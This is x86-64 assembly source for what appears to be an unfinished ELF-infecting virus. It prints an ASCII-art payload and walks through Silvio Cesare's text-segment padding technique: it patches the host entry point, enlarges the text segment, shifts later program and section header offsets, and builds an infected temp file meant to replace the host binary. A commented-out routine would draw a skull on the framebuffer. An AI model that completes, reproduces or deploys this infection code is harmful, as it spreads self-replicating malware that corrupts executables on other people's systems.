		db 0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2e,0x2e,0x24,0x24,0x24,0x24,0x2c,0x2c,0x24,0x2b,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x50,0x50,0x2b,0x2b,0x50,0x50,0x2b,0x24,0x24,0x24,0x59,0x2b,0x24,0x2c,0x24,0x59,0x2c,0x2c,0x59,0x24,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x24,0x2b,0x2c,0x2e,0x2e,0x2e,0x2c,0x24,0x2c,0x2c,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x50,0x50,0x2b,0x2a,0x25,0x2b,0x24,0x24,0x24,0x2b,0x2b,0x2c,0x2c
		db 0x59,0x59,0x2c,0x2c,0x2c,0x59,0x59,0x2c,0x2e,0x2c,0x24,0x2c,0x2e,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x2c,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2b,0x50,0x2b,0x50,0x2c,0x2c,0x2b,0x2c,0x2e,0x50,0x2b,0x2c,0x24,0x2a,0x24,0x2c,0x2c,0x2c,0x59,0x2a,0x24
		db 0x2c,0x59,0x50,0x24,0x24,0x59,0x59,0x24,0x2c,0x2c,0x24,0x2c,0x2e,0x2e,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2b,0x50,0x50,0x59,0x24,0x24,0x2c,0x2c,0x2b,0x59,0x24,0x50,0x2a,0x59,0x59,0x25,0x25,0x2a,0x2a,0x2a,0x25,0x25
		db 0x2b,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x24,0x2a,0x2a,0x50,0x50,0x2a,0x25,0x25,0x25,0x44,0x44,0x25,0x44,0x44,0x25,0x25,0x2a,0x44,0x2a,0x2b,0x59,0x59
		db 0x2b,0x2c,0x2e,0x2e,0x2e,0x2e,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0xa,0x24,0x2c,0x2c,0x2c,0x59,0x2a,0x2b,0x59,0x2b,0x59,0x50,0x50,0x24,0x2a,0x2b,0x24,0x25,0x2a,0x2c,0x2c,0x24,0x44,0x2a,0x24,0x2c
		db 0x24,0x50,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0xa,0x24,0x24,0x24,0x24,0x24,0x50,0x2a,0x2b,0x59,0x2b,0x2b,0x25,0x2b,0x25,0x25,0x2b,0x2a,0x25,0x50,0x2b,0x50,0x2a,0x2b,0x59
		db 0x2b,0x2b,0x2b,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0xa,0x24,0x24,0x24,0x24,0x2b,0x50,0x2a,0x50,0x50,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x2b,0xa,0x59,0x59,0x59,0x2b,0x2a,0x2a,0x2a,0x2a,0x2a,0x50,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24
		db 0x24,0x24,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0xa,0x59,0x59,0x2b,0x2b,0x2a,0x25,0x2a,0x2a,0x50,0x2b,0x2b,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24
	payload_len equ $-painting
	
payload:
	pop rsi
	mov rdx, payload_len
	mov rax, SYS_WRITE
	mov rdi, STDOUT
	syscall
	
	jmp _restore

;jmp frankenstein_elf		
;****************************************************************************************
;	Infection routine:
;
;	assumes the following:
; 	vlen == length of virus code
;	PAGESIZE == 4096	
;
;	1. identify entry point of host program and patch virus code to jump back to original
;	host entry point
;	2. 	a. copy ELF header from host program to virus;
;		b. change e_shoff in virus ELF header to new e_shoff s.t. 
;			new_vx_e_shoff = host_e_shoff + PAGESIZE
;	3. 	a. Loop through all Phdrs to find the text segment Phdr
;		b. if curr_Phdr == text_segment_Phdr then, do the following:
;			i. modify entry point of ELF header to point to the virus code
;			ii. increase p_filesz by vlen [p_filesz += vlen] 
;			iii. increase p_memsz by vlen, [p_memsz += vlen]
;		c. Else, for all Phdrs corresponding to segments located after the inserted virus code (aka for each Phdr of a segment after the text segment), then, do the following:
;			i. increase p_offset by PAGESIZE
;	4. Loop through all Shdrs
;		a. If curr_shdr == last_shdr_text_segment then,
;			i. increase sh_len by vlen [sh_len += vlen]
;		b. Else, for all Shdrs corresponding to sections located after the inserted virus code (aka for each Shdr of a section after virus code), then, do the following:
;			i. increase sh_offset by PAGESIZE [sh_offset += PAGESIZE]
;	5. Insert the virus code into the host program (or, in our case, into the tempfile we are constructing to replace host program)
;
;****************************************************************************************

infect:
	;sub rsp, 0x8
	push rbp
	mov rbp, rsp
	mov r13, rax
	;jmp frankenstein_elf
	lea r12, [r13 + elf_ehdr.e_phoff]		;address of host ELF Program Header Table in r12
	lea r15, [r13 + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
;	mov rdx, checkphdrstartlen
;	lea rsi, checkphdrstart
;	mov rdi, STDOUT
;	mov rax, SYS_WRITE
;	syscall

	
;;	mov qword r11, [rax + elf_ehdr.e_entry] ;save original host file entry point for jmp in vx code
;;	mov qword [vxhostentry], r11
;****************************************************************************************
;	Update program headers of infected ELF
;
;	e_phentsize == size of program header entry	
;	size of program header table == e_phnum * e_phentsize
;
;	vx_offset = the offset to start of vx code after insertion into host program 
;	vx_offset will replace e_entry in ELF header as the new entry point in infected ELF
;
;
;****************************************************************************************
	;mov word rcx, [rax + elf_ehdr.e_phnum]
	;mov rdx, [rax + elf_ehdr.e_phentsize]

	xor rcx, rcx
	check_phdrs:
		;push rcx
		.phdr_loop:
			;cmp rcx, 0
			;jg .mod_subsequent_phdr		
			;cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
			cmp word [r12 + elf_phdr.p_type], 0x0100			
			jne .mod_subsequent_phdr
			.mod_curr_header:
				mov rdx, checkptloadpasslen
				lea rsi, checkptloadpass
				mov rdi, STDOUT
				mov rax, SYS_WRITE
				syscall
	;		mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
	;		add r10, [r13 + r12 + elf_phdr.p_filesz]
	;		add qword r10, [ventry]				;new entry point = evaddr + ventry
	;		mov qword [evaddr], r10
	;		mov [rax + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
	;		mov r10, [r12 + elf_phdr.p_offset] 
	;		add r10, [r12 + elf_phdr.p_filesz]				
	;		mov qword [vxoffset], r10
	;		add qword [r12 + elf_phdr.p_filesz], vlen	
	;		add qword [r12 + elf_phdr.p_memsz], vlen	

			.mod_subsequent_phdr:
				mov rdx, checkptloadfaillen
				lea rsi, checkptloadfail
				mov rdi, STDOUT
				mov rax, SYS_WRITE
				syscall
				add dword [r12 + elf_phdr.p_offset], PAGESIZE
		.next_phdr:
			;pop rcx
			inc cx 
			;add r12, rdx 
			;add word r12d, [rax+ elf_ehdr.e_phentsize]
			cmp word cx, [r13 + elf_ehdr.e_phnum]
			;jg check_shdrs
			jg frankenstein_elf
			add word r12w, [r13 + elf_ehdr.e_phentsize]
			jnz .phdr_loop			

	jmp frankenstein_elf
;****************************************************************************************
;	Now update section headers of infected ELF
;****************************************************************************************

	mov rdx, [rax + elf_ehdr.e_shentsize]
	xor r11, r11
	xor rcx, rcx
	check_shdrs:
		push rcx
		.shdr_loop:
			cmp qword [r15 + elf_shdr.sh_offset], vxoffset
			jge .mod_subsequent_shdr
			mov r11, [r15 + elf_shdr.sh_addr]
			add r11, [r15 + elf_shdr.sh_size]
			cmp r10, r11
			jne .mod_subsequent_shdr
			add qword [r15 + elf_shdr.sh_size], vlen


			.mod_subsequent_shdr:
				add qword [r15 + elf_shdr.sh_offset], PAGESIZE
		;.next_shdr:
		pop rcx
		inc rcx 
		add r15, rdx 
		cmp rcx, [rax + elf_ehdr.e_shnum]
		jl .shdr_loop

	mov r11, qword [rax + elf_ehdr.e_shoff]
	mov qword [oshoff], r11
	cmp qword r11, [vxoffset]
	;jg .patch_ehdr_shoff
	jl frankenstein_elf
	jmp fin_infect
	
	

;****************************************************************************************
;	From silvio's article [1], we know that an infected ELF will have 
;	the following layout:
;
;	ELF Header
;	Program Header Table
;	Segment 1
;		text
;		parasite
;
;	Segment 2
;	Section Header Table
;	Section 1
;	...
;	Section n
;
;	So this is the order in which we will construct (write to) our new complete
;	infected ELF -- currently a temp file, to be renamed to that of the host
;
;
;	Our plan for building this file will be to do the following:
;	create new temp file ".xo.tmp"
;	lseek to position 0 in .xo.tmp
;	write modified elf header to .xo.tmp
;	write modified program header to .xo.tmp
;	lseek to host text segment in host ELF 
;	copy (write) host text segment from host ELF to .xo.tmp
;	write virus body to .xo.tmp
;	write patched jmp to original host entry point (push ret), after  vx body in .xo.tmp
;	write any padding bytes needed to maintain page alignment for temp file
;	write modified section header table to .xo.tmp
;	lseek to end of section header table in host ELF
;	copy (write) remaining bytes (end of shdr table to EOF) from host ELF to .xo.tmp
;	
;	TODO: add routine for renaming .xo.tmp to original host file name
;	TODO: add routine for changing permissions/owner of infected ELF to match 
;			those of the original host file
;	close temp file
;	unmap file from memory
;
;****************************************************************************************

frankenstein_elf:
	;mov r13, rax
	;push 0	
	;mov byte [r14+ 0xa00], 0x0
	mov rax, 0x00706d742e6f782e		;temp filename = ".xo.tmp\0"
	mov [r14 + 0x800], rax
	lea rdi, [r14 + 0x800]			;name of file in rdi
	mov rsi, 0777o					;mode - 755 (file perms for new file)
	;mov rsi, (O_CREAT | O_TRUNC | O_WRONLY)
	mov rax, SYS_CREAT
	syscall
	
	mov r9, rax
	mov rdi, rax

	;write ELF header to temp file

	mov rdx, 64
	mov rsi, r13					;r13 contains pointer to mmap'd file
	mov rdi, r9
	xor r10, r10
	mov rax, SYS_WRITE
	;mov rax, SYS_PWRITE64
	syscall
	
	;munmap file from work area
;	mov rdi, r13
;	mov qword rsi, [r14 + file_stat.st_size]
;	mov rax, SYS_MUNMAP
;	syscall

	;close temp file

	mov rdi, r9
	mov rax, SYS_CLOSE
	syscall


fin_infect:
	;add rsp, 0x8
	mov rsp, rbp
	pop rbp
	ret



;;restore stack to original state
_restore:
	add rsp, 0x1000
	;mov rsp, rbp
	;pop rbp
	
;exit
_end:
	xor rdi, rdi
	mov rax, 0x3c ;exit() syscall on x64
	syscall	

vlen equ $-_start

;****************************************************************************************
;	paint function, writes buffer of 4 byte values (R G B Alpha) pixels to framebuffer
;	where framebuffer is a device at /dev/fb0
;
;****************************************************************************************
;	
;paint:
;		mov rax, 0x3062662f7665642f  ;/dev/fb0 in little-endian
;		mov [r14 + 100], rax
;		lea rdi, [r14 + 100]
;		xor rsi, rsi 		;no flags
;		add rsi, 0x02000000
;		mov rdx, O_RDONLY	;open read-only
;		mov rax, SYS_OPEN
;		syscall
;		
;		mov r9, rax
;		mov rdi, rax
;		mov rsi, skullbitmap
;		mov rdx, paintlen
;		mov rax, SYS_WRITE
;		syscall
;
;		mov rdi, r9
;		mov rax, SYS_CLOSE
;		syscall
;		ret
	


